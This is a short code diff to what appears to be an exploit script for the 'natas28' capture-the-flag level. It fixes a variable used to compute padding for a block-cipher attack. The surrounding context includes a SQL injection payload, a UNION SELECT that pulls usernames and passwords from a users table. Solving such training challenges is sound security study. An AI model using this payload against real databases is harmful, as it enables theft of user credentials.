@@ -37,7 +37,7 @@ def natas28(url):
                 return block_size, i, cypher.index(cipher_a)
 
     block_size, index, cypher_size = _prefix_size(url)
-    point = 'a'* (i - 2)
+    point = 'a'* (index - 2)
     cypher = cipher_text(url, point)
 
     sql = " UNION ALL SELECT concat(username, 0x3A ,password) FROM users #"
